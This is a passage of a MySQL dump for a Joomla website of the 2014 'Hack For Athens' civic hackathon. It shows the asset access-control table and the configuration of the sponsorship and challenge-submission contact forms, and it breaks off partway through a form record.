-- MySQL dump 10.13  Distrib 5.5.37, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: hackforchange
-- ------------------------------------------------------
-- Server version	5.5.37-0ubuntu0.13.10.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `hfa_assets`
--

DROP TABLE IF EXISTS `hfa_assets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_assets` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `parent_id` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set parent.',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `level` int(10) unsigned NOT NULL COMMENT 'The cached level in the nested tree.',
  `name` varchar(50) NOT NULL COMMENT 'The unique name for the asset.\n',
  `title` varchar(100) NOT NULL COMMENT 'The descriptive title for the asset.',
  `rules` varchar(5120) NOT NULL COMMENT 'JSON encoded access control.',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_asset_name` (`name`),
  KEY `idx_lft_rgt` (`lft`,`rgt`),
  KEY `idx_parent_id` (`parent_id`)
) ENGINE=InnoDB AUTO_INCREMENT=130 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_assets`
--

LOCK TABLES `hfa_assets` WRITE;
/*!40000 ALTER TABLE `hfa_assets` DISABLE KEYS */;
INSERT INTO `hfa_assets` VALUES (1,0,1,171,0,'root.1','Root Asset','{\"core.login.site\":{\"6\":1,\"2\":1},\"core.login.admin\":{\"6\":1},\"core.login.offline\":{\"6\":1},\"core.admin\":{\"8\":1},\"core.manage\":{\"7\":1},\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(2,1,1,2,1,'com_admin','com_admin','{}'),(3,1,3,6,1,'com_banners','com_banners','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1},\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(4,1,7,8,1,'com_cache','com_cache','{\"core.admin\":{\"7\":1},\"core.manage\":{\"7\":1}}'),(5,1,9,10,1,'com_checkin','com_checkin','{\"core.admin\":{\"7\":1},\"core.manage\":{\"7\":1}}'),(6,1,11,12,1,'com_config','com_config','{}'),(7,1,13,16,1,'com_contact','com_contact','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1},\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[],\"core.edit.own\":[]}'),(8,1,17,68,1,'com_content','com_content','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1},\"core.create\":{\"3\":1},\"core.delete\":[],\"core.edit\":{\"4\":1},\"core.edit.state\":{\"5\":1},\"core.edit.own\":[]}'),(9,1,69,70,1,'com_cpanel','com_cpanel','{}'),(10,1,71,72,1,'com_installer','com_installer','{\"core.admin\":[],\"core.manage\":{\"7\":0},\"core.delete\":{\"7\":0},\"core.edit.state\":{\"7\":0}}'),(11,1,73,74,1,'com_languages','com_languages','{\"core.admin\":{\"7\":1},\"core.manage\":[],\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(12,1,75,76,1,'com_login','com_login','{}'),(13,1,77,78,1,'com_mailto','com_mailto','{}'),(14,1,79,80,1,'com_massmail','com_massmail','{}'),(15,1,81,82,1,'com_media','com_media','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1},\"core.create\":{\"3\":1},\"core.delete\":{\"5\":1}}'),(16,1,83,84,1,'com_menus','com_menus','{\"core.admin\":{\"7\":1},\"core.manage\":[],\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(17,1,85,86,1,'com_messages','com_messages','{\"core.admin\":{\"7\":1},\"core.manage\":{\"7\":1}}'),(18,1,87,102,1,'com_modules','com_modules','{\"core.admin\":{\"7\":1},\"core.manage\":[],\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(19,1,103,106,1,'com_newsfeeds','com_newsfeeds','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1},\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[],\"core.edit.own\":[]}'),(20,1,107,108,1,'com_plugins','com_plugins','{\"core.admin\":{\"7\":1},\"core.manage\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(21,1,109,110,1,'com_redirect','com_redirect','{\"core.admin\":{\"7\":1},\"core.manage\":[]}'),(22,1,111,112,1,'com_search','com_search','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1}}'),(23,1,113,114,1,'com_templates','com_templates','{\"core.admin\":{\"7\":1},\"core.manage\":[],\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(24,1,115,118,1,'com_users','com_users','{\"core.admin\":{\"7\":1},\"core.manage\":[],\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(25,1,119,124,1,'com_weblinks','com_weblinks','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1},\"core.create\":{\"3\":1},\"core.delete\":[],\"core.edit\":{\"4\":1},\"core.edit.state\":{\"5\":1},\"core.edit.own\":[]}'),(26,1,125,126,1,'com_wrapper','com_wrapper','{}'),(27,8,18,37,2,'com_content.category.2','Hack For Athens','{\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[],\"core.edit.own\":[]}'),(28,3,4,5,2,'com_banners.category.3','Uncategorised','{\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(29,7,14,15,2,'com_contact.category.4','Uncategorised','{\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[],\"core.edit.own\":[]}'),(30,19,104,105,2,'com_newsfeeds.category.5','Uncategorised','{\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[],\"core.edit.own\":[]}'),(31,25,120,121,2,'com_weblinks.category.6','Uncategorised','{\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[],\"core.edit.own\":[]}'),(32,24,116,117,1,'com_users.category.7','Uncategorised','{\"core.create\":[],\"core.delete\":[],\"core.edit\":[],\"core.edit.state\":[]}'),(33,1,127,128,1,'com_finder','com_finder','{\"core.admin\":{\"7\":1},\"core.manage\":{\"6\":1}}'),(34,1,129,130,1,'com_joomlaupdate','com_joomlaupdate','{\"core.admin\":[],\"core.manage\":[],\"core.delete\":[],\"core.edit.state\":[]}'),(35,1,131,132,1,'com_gantry','gantry','{}'),(37,1,133,134,1,'com_rokcandy.category.8','Basic',''),(38,1,135,136,1,'com_rokcandy.category.9','Typography',''),(39,1,137,138,1,'com_rokcandy.category.10','Uncategorised',''),(40,1,139,140,1,'com_rokcandy','rokcandy','{}'),(41,1,141,142,1,'com_roksprocket','roksprocket','{}'),(42,8,38,39,2,'com_content.category.11','Demo Articles','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(43,8,40,41,2,'com_content.category.12','Sample Content','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(44,8,42,43,2,'com_content.category.13','RokSprocket Mosaic','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(45,8,44,45,2,'com_content.category.14','RokSprocket Tabs','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(46,8,46,47,2,'com_content.category.15','RokSprocket Lists','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(47,8,48,53,2,'com_content.category.16','Frontpage Content','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(67,25,122,123,2,'com_weblinks.category.17','RocketTheme','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(85,47,49,50,3,'com_content.article.37','Hack For Athens | 2014','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(87,1,143,144,1,'com_kunena','com_kunena','{}'),(88,1,145,146,1,'com_quicklogout','quicklogout','{}'),(91,47,51,52,3,'com_content.article.38','Front Page Intro','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(92,27,19,20,3,'com_content.article.39','Sponsorship','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(93,27,21,22,3,'com_content.article.40','Challenges','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(94,27,23,24,3,'com_content.article.41','Datasets','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(96,1,147,148,1,'com_gcalendar','com_gcalendar','{\"core.admin\":[],\"core.manage\":[],\"core.create\":[],\"core.delete\":[],\"core.edit\":[]}'),(97,27,25,26,3,'com_content.article.42','Resources','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(98,27,27,28,3,'com_content.article.43','Open Source Guidelines','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(99,27,29,30,3,'com_content.article.44','Schedule','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(100,27,31,32,3,'com_content.article.45','Teams','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(101,27,33,34,3,'com_content.article.46','Sponsorship Payment','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(102,27,35,36,3,'com_content.article.47','Pitch Contest','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(104,1,149,150,1,'com_joomailermailchimpintegration','joomailermailchimpintegration','{}'),(105,1,151,152,1,'com_joomailermailchimpsignup','joomailermailchimpsignup','{}'),(106,107,55,56,3,'com_content.article.48','Safe Drinking Water Challenge','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(107,8,54,67,2,'com_content.category.18','Challenges','{\"core.create\":{\"6\":1,\"3\":1},\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1},\"core.edit.own\":{\"6\":1,\"3\":1}}'),(108,107,57,58,3,'com_content.article.49','Athens Affordable Internet Challenge','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(109,107,59,60,3,'com_content.article.50','Athens Alive Challenge','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(110,107,61,62,3,'com_content.article.51','Athens Open Data Portal Challenge','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(111,107,63,64,3,'com_content.article.52','Local Banking Benefits Challenge','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(112,107,65,66,3,'com_content.article.53','Athens OpenStreetMap Challenge','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(113,1,153,154,1,'com_xmap','com_xmap','{}'),(115,1,155,156,1,'com_rokgallery','rokgallery','{}'),(116,1,157,158,1,'com_rokbridge','rokbridge','{}'),(117,1,159,160,1,'com_tags','com_tags','{}'),(118,1,161,162,1,'com_contenthistory','com_contenthistory','{}'),(119,1,163,164,1,'com_ajax','com_ajax','{}'),(120,1,165,166,1,'com_postinstall','com_postinstall','{}'),(121,1,167,168,1,'com_jce','jce','{}'),(122,18,88,89,2,'com_modules.module.244','B2J Contact',''),(123,1,169,170,1,'com_b2jcontact','com_b2jcontact','{}'),(124,18,90,91,2,'com_modules.module.166','Front Page Showcase',''),(125,18,92,93,2,'com_modules.module.173','Hack For Athens Info','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(126,18,94,95,2,'com_modules.module.201','Hack For Athens Info','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(127,18,96,97,2,'com_modules.module.169','How Can I Help?','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(128,18,98,99,2,'com_modules.module.218','Hack For Athens Venue','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}'),(129,18,100,101,2,'com_modules.module.216','The Event','{\"core.delete\":{\"6\":1},\"core.edit\":{\"6\":1,\"4\":1},\"core.edit.state\":{\"6\":1,\"5\":1}}');
/*!40000 ALTER TABLE `hfa_assets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_associations`
--

DROP TABLE IF EXISTS `hfa_associations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_associations` (
  `id` int(11) NOT NULL COMMENT 'A reference to the associated item.',
  `context` varchar(50) NOT NULL COMMENT 'The context of the associated item.',
  `key` char(32) NOT NULL COMMENT 'The key for the association computed from an md5 on associated ids.',
  PRIMARY KEY (`context`,`id`),
  KEY `idx_key` (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_associations`
--

LOCK TABLES `hfa_associations` WRITE;
/*!40000 ALTER TABLE `hfa_associations` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_associations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_b2jcontact_details`
--

DROP TABLE IF EXISTS `hfa_b2jcontact_details`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_b2jcontact_details` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `default_con` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `catid` int(11) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `mobile` varchar(255) NOT NULL DEFAULT '',
  `webpage` varchar(255) NOT NULL DEFAULT '',
  `sortname1` varchar(255) NOT NULL,
  `sortname2` varchar(255) NOT NULL,
  `sortname3` varchar(255) NOT NULL,
  `language` char(7) NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `xreference` varchar(50) NOT NULL,
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`published`),
  KEY `idx_createdby` (`created_by`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_b2jcontact_details`
--

LOCK TABLES `hfa_b2jcontact_details` WRITE;
/*!40000 ALTER TABLE `hfa_b2jcontact_details` DISABLE KEYS */;
INSERT INTO `hfa_b2jcontact_details` VALUES (1,'Sponsorship Form','sponsorship-form',0,1,0,'0000-00-00 00:00:00',1,'{\"to_address\":\"your@email.com\",\"cc_address\":\"\",\"bcc_address\":\"\",\"email_subject\":\"Sponsorship Request | Hack For Athens\",\"jmessenger_user\":\"0\",\"page_subheading\":\"Sponsorship Form\",\"form__width\":{\"text\":\"\",\"select\":\"auto\"},\"customhtml0\":\"If you\'d like to sponsor the Hack For Athens event, please fill out the form below. Thank you, and we will be in touch shortly.\",\"customhtml0display\":\"1\",\"customhtml0order\":\"-1000\",\"customhtml1\":\"By submitting this form, you accept our privacy policy.\",\"customhtml1display\":\"1\",\"customhtml1order\":\"1000\",\"labelsdisplay\":\"1\",\"form_layout\":\"extended\",\"labels__width\":\"150\",\"sender1isemail\":\"1\",\"text__width\":\"270\",\"dropdown__width\":\"270\",\"textarea__width\":\"270\",\"textarea__height\":{\"text\":\"180\",\"select\":\"px\"},\"uploaddisplay\":\"0\",\"uploadmethod\":\"1\",\"upload\":\"Select files to attach\",\"upload_btn\":\"Browse files\",\"reset_attachment_btn\":\"Reset attachments\",\"uploadmax_file_size\":\"102400\",\"upload_filter\":\"1\",\"upload_audio\":\"0\",\"upload_video\":\"0\",\"upload_images\":\"1\",\"upload_documents\":\"1\",\"upload_archives\":\"1\",\"submittext\":\"Submit\",\"submittype\":\"0\",\"resetbutton\":\"0\",\"resettext\":\"Reset\",\"resettype\":\"0\",\"email_sent_action\":\"0\",\"email_sent_text\":\"Your sponsorship request has been received. We will be in touch shortly.\",\"email_sent_textdisplay\":\"1\",\"email_sent_page\":\"176\",\"copy_to_submitter\":\"0\",\"email_copy_subject\":\"Thank you for submitting your sponsorship request\",\"email_copy_text\":\"This message is a confirmation that your sponsorship request has been successfully submitted and will be processed as soon as possible.\",\"email_copy_summary\":\"0\",\"spam_check\":\"1\",\"spam_words\":\"www,http,url=,href=,link=,.txt,shit,fuck\",\"spam_detected_text\":\"We are sorry, but it seems that your message contains unwanted advertising therefore it <b>has been blocked<\\/b>.<br \\/>Please try again avoiding words such as <i>www, http,<\\/i> and similar.\",\"spam_detected_textdisplay\":\"1\",\"stdcaptchadisplay\":\"0\",\"stdcaptcha\":\"Security code\",\"stdcaptchatype\":\"0\",\"stdcaptcha_length\":\"5\",\"stdcaptchawidth\":\"150\",\"stdcaptchaheight\":\"75\",\"stdcaptchafont\":\"-1\",\"stdcaptchafontmin\":\"14\",\"stdcaptchafontmax\":\"20\",\"stdcaptchaangle\":\"20\",\"stdcaptcha_backgroundcolor\":\"#ffffff\",\"stdcaptcha_textcolor\":\"#191919\",\"stdcaptcha_disturbcolor\":\"#c8c8c8\",\"itemgroups\":\"{\\\"0\\\":[{\\\"title\\\":\\\"create new group\\\",\\\"class\\\":\\\"\\\",\\\"ordering\\\":\\\"0\\\",\\\"state\\\":\\\"1\\\"}],\\\"1\\\":[{\\\"title\\\":\\\"Sponsorship\\\",\\\"ordering\\\":\\\"1\\\",\\\"class\\\":\\\"\\\",\\\"state\\\":\\\"1\\\"}]}\",\"dynamicfields\":\"{\\\"0\\\":[{\\\"b2jDefaultValue\\\":\\\"Enter your organization or business name\\\",\\\"b2jFieldKey\\\":\\\"0\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Organization\\/Business Name\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"0\\\"}],\\\"1\\\":[{\\\"b2jFieldRadio\\\":\\\"0\\\",\\\"b2jDefaultValue\\\":\\\"\\\",\\\"b2jFieldKey\\\":\\\"1\\\",\\\"type\\\":\\\"b2jDynamicEmail\\\",\\\"b2jFieldName\\\":\\\"Email Address\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"1\\\"}],\\\"2\\\":[{\\\"b2jDefaultValue\\\":\\\"\\\",\\\"b2jFieldKey\\\":\\\"2\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Phone Number\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"2\\\"}],\\\"3\\\":[{\\\"b2jFieldItems\\\":\\\"Bootstrap,Angel,Venture\\\",\\\"b2jDefaultValue\\\":\\\"\\\",\\\"b2jFieldKey\\\":\\\"3\\\",\\\"type\\\":\\\"b2jDynamicDropdown\\\",\\\"b2jFieldName\\\":\\\"Sponsorship Level\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"3\\\"}]}\"}',0,0,1,'','','','','','*','2014-04-14 18:45:12',254,'','2014-04-30 21:26:35',254,'','','',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',3,0),(2,'Submit a Challenge','submit-a-challenge',0,1,0,'0000-00-00 00:00:00',2,'{\"to_address\":\"your@email.com\",\"cc_address\":\"\",\"bcc_address\":\"\",\"email_subject\":\"Challenge Submission | Hack For Athens\",\"jmessenger_user\":\"0\",\"page_subheading\":\"Submit a Challenge\",\"form__width\":{\"text\":\"\",\"select\":\"auto\"},\"customhtml0\":\"nterested in framing a challenge for the community to work on? Are there issues in your community that data, technology and entrepreneurship could help to address? Share them with us!\",\"customhtml0display\":\"1\",\"customhtml0order\":\"-1000\",\"customhtml1\":\"\",\"customhtml1display\":\"1\",\"customhtml1order\":\"1000\",\"labelsdisplay\":\"1\",\"form_layout\":\"extended\",\"labels__width\":\"150\",\"sender1isemail\":\"1\",\"text__width\":\"270\",\"dropdown__width\":\"270\",\"textarea__width\":\"270\",\"textarea__height\":{\"text\":\"180\",\"select\":\"px\"},\"uploaddisplay\":\"0\",\"uploadmethod\":\"1\",\"upload\":\"Select files to attach\",\"upload_btn\":\"Browse files\",\"reset_attachment_btn\":\"Reset attachments\",\"uploadmax_file_size\":\"102400\",\"upload_filter\":\"1\",\"upload_audio\":\"0\",\"upload_video\":\"0\",\"upload_images\":\"1\",\"upload_documents\":\"1\",\"upload_archives\":\"1\",\"submittext\":\"Submit\",\"submittype\":\"0\",\"resetbutton\":\"0\",\"resettext\":\"Reset\",\"resettype\":\"0\",\"email_sent_action\":\"0\",\"email_sent_text\":\"Thank you for submitting your challenge, we will review it shortly and be back to you with any questions if need be\",\"email_sent_textdisplay\":\"1\",\"email_sent_page\":\"176\",\"copy_to_submitter\":\"0\",\"email_copy_subject\":\"Thank you for contacting us\",\"email_copy_text\":\"This message is a confirmation that your information has been successfully submitted and will be processed as soon as possible.\",\"email_copy_summary\":\"0\",\"spam_check\":\"1\",\"spam_words\":\"www,http,url=,href=,link=,.txt,shit,fuck\",\"spam_detected_text\":\"We are sorry, but it seems that your message contains unwanted advertising therefore it <b>has been blocked<\\/b>.<br \\/>Please try again avoiding words such as <i>www, http,<\\/i> and similar.\",\"spam_detected_textdisplay\":\"1\",\"stdcaptchadisplay\":\"0\",\"stdcaptcha\":\"Security code\",\"stdcaptchatype\":\"0\",\"stdcaptcha_length\":\"5\",\"stdcaptchawidth\":\"150\",\"stdcaptchaheight\":\"75\",\"stdcaptchafont\":\"-1\",\"stdcaptchafontmin\":\"14\",\"stdcaptchafontmax\":\"20\",\"stdcaptchaangle\":\"20\",\"stdcaptcha_backgroundcolor\":\"#ffffff\",\"stdcaptcha_textcolor\":\"#191919\",\"stdcaptcha_disturbcolor\":\"#c8c8c8\",\"itemgroups\":\"{\\\"0\\\":[{\\\"title\\\":\\\"create new group\\\",\\\"class\\\":\\\"\\\",\\\"ordering\\\":\\\"0\\\",\\\"state\\\":\\\"1\\\"}],\\\"1\\\":[{\\\"title\\\":\\\"Challenge Submission\\\",\\\"ordering\\\":\\\"1\\\",\\\"class\\\":\\\"\\\",\\\"state\\\":\\\"1\\\"}]}\",\"dynamicfields\":\"{\\\"0\\\":[{\\\"b2jDefaultValue\\\":\\\"First and Last Name\\\",\\\"b2jFieldKey\\\":\\\"0\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Name\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"0\\\"}],\\\"1\\\":[{\\\"b2jFieldRadio\\\":\\\"0\\\",\\\"b2jDefaultValue\\\":\\\"Your Email Address\\\",\\\"b2jFieldKey\\\":\\\"1\\\",\\\"type\\\":\\\"b2jDynamicEmail\\\",\\\"b2jFieldName\\\":\\\"Email\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"1\\\"}],\\\"2\\\":[{\\\"b2jDefaultValue\\\":\\\"\\\",\\\"b2jFieldKey\\\":\\\"2\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Affiliated Organization\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"1\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"2\\\"}],\\\"3\\\":[{\\\"b2jDefaultValue\\\":\\\"Describe your challenge idea for the Hack For Athens event\\\",\\\"b2jFieldKey\\\":\\\"3\\\",\\\"type\\\":\\\"b2jDynamicTextarea\\\",\\\"b2jFieldName\\\":\\\"Challenge Idea\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"3\\\"}],\\\"4\\\":[{\\\"b2jDefaultValue\\\":\\\"If there is a specific API or dataset that corresponds to this challenge, please list it here.\\\",\\\"b2jFieldKey\\\":\\\"4\\\",\\\"type\\\":\\\"b2jDynamicTextarea\\\",\\\"b2jFieldName\\\":\\\"API\\/Data\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"1\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"4\\\"}]}\"}',0,0,1,'','','','','','*','2014-04-23 18:29:42',254,'','2014-04-30 